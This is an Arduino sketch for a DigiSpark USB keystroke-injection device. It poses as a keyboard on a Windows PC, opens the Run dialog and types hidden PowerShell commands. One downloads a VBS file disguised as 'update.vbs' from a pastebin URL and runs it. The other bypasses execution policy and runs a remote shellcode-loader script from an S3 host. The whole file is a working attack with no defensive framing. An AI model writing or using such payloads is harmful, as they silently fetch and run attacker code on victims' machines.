  //This DigiSpark scripts downloads and executes a powershell script in hidden mode.
  #include "DigiKeyboard.h"
  void setup() {
  }
  
  void loop() {
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(4000);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(300);
    DigiKeyboard.print("powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/YcXygagz', '%temp%/update.vbs'); %temp%/update.vbs");
    DigiKeyboard.delay(50);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  
    //Wait 2 minutes
    DigiKeyboard.delay(120000);
  
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(300);
    DigiKeyboard.print("powershell -W hidden -NoLogo -ep bypass -nop -c  IEX (New-Object Net.WebClient).DownloadString('https://s3.ap-south-1.amazonaws.com/giros/exe/ps_shellcode_bmp_DKMC.ps1');");
    DigiKeyboard.delay(50);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
    for (;;) {
      /*empty*/
    }
  
  }
